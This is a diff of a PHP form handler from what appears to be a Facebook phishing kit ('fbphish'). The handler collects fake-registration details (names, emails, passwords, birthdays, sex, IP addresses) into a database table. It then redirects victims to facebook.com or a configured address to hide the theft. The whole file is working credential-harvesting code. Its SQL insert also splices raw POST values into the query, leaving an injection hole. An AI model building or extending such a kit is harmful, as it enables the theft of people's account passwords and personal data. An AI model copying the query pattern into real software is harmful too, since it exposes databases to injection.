@@ -1,6 +1,9 @@
 <?php
+// Set SUPER Vars
+$fullpath = dirname(__FILE__);
+
 // Require...
-require('/config.inc.php');
+require("$fullpath/config.inc.php");
 
 // Check if register form is NOT submitted
 if($_POST['submit'] != "true"){
@@ -22,7 +25,6 @@ if($_POST['submit'] != "true"){
 		die();
 	}
 }
-
 
 // Check if register form is submitted
 if(isset($_POST['submit'])){
@@ -77,85 +79,117 @@ if(isset($_POST['submit'])){
 	}
 
 	// Check if variable is empty
-	if(empty($_POST['reg_birthday_day'])){
+	if(empty($_POST['birthday_day'])){
 		// If empty then put message in the array() "missing"
 		$missing[] = "Birthday-day missing";
 	}else{
 		// Else set the variable
-		$reg_birthday_day = $_POST['reg_birthday_day'];
+		$reg_birthday_day = $_POST['birthday_day'];
 	}
 
 	// Check if variable is empty
-	if(empty($_POST['reg_birthday_month'])){
+	if(empty($_POST['birthday_month'])){
 		// If empty then put message in the array() "missing"
 		$missing[] = "Birthday-month missing";
 	}else{
 		// Else set the variable
-		$reg_birthday_month = $_POST['reg_birthday_month'];
+		$reg_birthday_month = $_POST['birthday_month'];
 	}
 
 	// Check if variable is empty
-	if(empty($_POST['reg_birthday_year'])){
+	if(empty($_POST['birthday_year'])){
 		// If empty then put message in the array() "missing"
 		$missing[] = "Birthday-year missing";
 	}else{
 		// Else set the variable
-		$reg_birthday_year = $_POST['reg_birthday_year'];
+		$reg_birthday_year = $_POST['birthday_year'];
 	}
 
 	// Check if variable is empty
-	if(empty($_POST['reg_sex'])){
+	if(empty($_POST['sex'])){
 		// If empty then put message in the array() "missing"
 		$missing[] = "Sex missing";
 	}else{
 		// Else set the variable
-		$reg_sex = $_POST['reg_sex'];
+		$reg_sex = $_POST['sex'];
 	}
 
 	// Check if variable is empty
-	if(empty($_POST['reg_locale'])){
+	if(empty($_POST['locale'])){
 		// If empty then put message in the array() "missing"
-		$missing[] = "reg_locale missing";
+		$missing[] = "Locale missing";
 	}else{
 		// Else set the variable
-		$reg_locale = $_POST['reg_locale'];
+		$reg_locale = $_POST['locale'];
 	}
 
 	// Check if there are any missing(s) variables
 	if(!empty($missing)){
 		// If there are any missing(s) then make the "complete" false
 		$complete = "false";
+		// Turn the missing variable into a string
+		$missing_string = implode('; ', $missing);
 	}else{
-		// If there are any missing(s) then make the "complete" true
+		// If there no missing(s) then make the "complete" true
 		$complete = "true";
+		// Set missing to NULL
+		$missing = "NULL";
 	}
 
-
-	// DATABASE CONNECT AND INSERT
-
-
-
-
-
+	// Database connect and insert
 	try{
-	    $fbphish_database_conn = new PDO('mysql:host=$fbphish_sql_host;dbname=$fbphish_sql_db', $fbphish_sql_user, $fbphish_sql_password);
+		// Connect
+	    $fbphish_database_conn = new PDO("mysql:host=$fbphish_sql_host;dbname=$fbphish_sql_db", $fbphish_sql_user, $fbphish_sql_password);
 	    // set the PDO error mode to exception
 	    $fbphish_database_conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-		echo "Connected successfully"; 
+	    $fbphish_database_conn->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
+	    // Set the sql query
+		$fbphish_sql_query_insertRegisterData = "INSERT INTO `fbphish_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, 'register', CURRENT_TIMESTAMP, '$reg_firstname', '$reg_lastname', '$reg_email', '$reg_email_confirmation', '$reg_passwd', '$reg_birthday_day', '$reg_birthday_month', '$reg_birthday_year', '$reg_sex', 'nl_NL', '$reg_user_ip', '$reg_meta_user_ip', '$missing_string');";
+		// Execute sql
+		$fbphish_database_conn->exec($fbphish_sql_query_insertRegisterData);
 	}catch(PDOException $fbphish_database_conn_err){
-	    echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
+		// Error reporting
+		switch($config_option__451){
+			case "facebook":
+				header("Location: https://facebook.com");
+				break;
+			case "home":
+				header("Location: /index.php");
+				break;
+			case "show":
+				echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
+				break;
+			default:
+				header("Location: $config_option__451");
+		}
 	}
-
-
-
-
-
+	// Close connection
+	$fbphish_database_conn = null;
 
 	// If complete is "true" execute code/sql
 	if($complete == "true"){
-		// EXECUTE PHP HERE
+		switch($config_option__301){
+			case "facebook":
+				header("Location: https://facebook.com");
+				break;
+			case "home":
+				header("Location: /index.php");
+				break;
+			default:
+				header("Location: $config_option__301");
+		}
 	}elseif($complete == "false"){
-		// EXECUTE PHP HERE
+		switch($config_option__302){
+			case "facebook":
+				header("Location: https://facebook.com");
+				break;
+			case "home":
+				header("Location: /index.php");
+				break;
+			default:
+				header("Location: $config_option__302");
+
+		}
 	}
 }
 
